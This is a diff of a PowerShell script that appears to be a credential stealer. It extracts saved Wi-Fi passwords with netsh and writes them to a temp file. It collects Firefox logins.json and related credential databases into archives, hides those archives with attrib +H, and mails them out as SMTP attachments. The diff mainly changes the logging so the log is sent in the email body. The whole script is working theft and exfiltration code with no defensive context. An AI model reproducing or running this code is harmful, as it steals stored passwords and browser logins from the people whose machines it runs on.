@@ -1,15 +1,21 @@
 # (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
-echo "qwe"
-$e=""
+# echo "qwe"
+# $e=""
 #######
-function WL{
-  Param ([string]$LS)
-  $St = (Get-Date)#.toString("yyyy/MM/dd HH:mm:ss")
-#   $LM = "$St $LS"
-  ac ($env:TEMP+"\proc_$env:computername.log") -value "$St $LS"
-  #$LM
-}
-WL "Start"
+# $l=($env:TEMP+"\proc_$env:computername.log")
+# function WL{
+#   Param ([string]$LS)
+#   $St = (Get-Date)#.toString("yyyy/MM/dd HH:mm:ss")
+#   ac $l -value "$St $LS"
+# }
+# function WL{
+#   Param ([string]$LS)
+#   $LOG = ($LOG + $LS)
+# }
+$LOG=""
+$LOG = ($LOG + " Start ")
+# WL "Start"
+
 #######
 if(Test-Path "C:\Program Files\7-Zip\3123127z.exe"){
   cd "C:\Program Files\7-Zip\"
@@ -20,7 +26,8 @@ elseif (Test-Path "C:\Program Files\WinRAR\RAR.exe"){
   $arh="W"
 }
 else{WL "asd"}
-WL $arh
+# WL $arh
+$LOG = ($LOG + $arh)
 echo $arh
 
 $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db", "");
@@ -45,34 +52,40 @@ for ($i=0; $i -lt 5; $i++){
     if($arh-eq "7"){
       $p=($p+".zip")
      .\7z.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -put -spf -tzip
-#      Invoke-Expression (".\7z.exe a $p{0} (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip" -f $i)
      }
     elseif($arh-eq "W"){
       $p=($p+".rar")
-      .\RAR.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -ep3 -hput #-inul
+      .\RAR.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -ep3 #-hput -inul
     }
     else{
       $p=($p+".zip")
       gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
     }
-    WL $p
+#     WL $p
+    $LOG = ($LOG+" "+$p)
     attrib +H $p
     echo ("____ "+$p)
     $ReportEmail.Subject=$lst[$i][1]
-    
+#     echo $LOG
+    $ReportEmail.Body=$LOG
+    # arh
     $s=New-Object Net.Mail.Attachment($p)
     $ReportEmail.Attachments.Add($s)
-    #echo "SEND!!!"
+    # log
+#     $s=New-Object Net.Mail.Attachment($l)
+#     $ReportEmail.Attachments.Add($s)
+
     $SMTPInfo.Send($ReportEmail)
 #     $s.Dispose()
   echo '----------', $arh, '----------'
   }
   else{
-    WL ($lst[$i][1])
+#     WL ($lst[$i][1])
+    $LOG = ($LOG+" "+($lst[$i][1]))
     echo ($lst[$i][1]) #$e=$e+' '+$lst[$i][1]#     
   }
 }
-WL "END"
+# WL "END"
 # echo "56565656565656565656565656"
 WL (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize
 # > $env:TEMP\w.txt
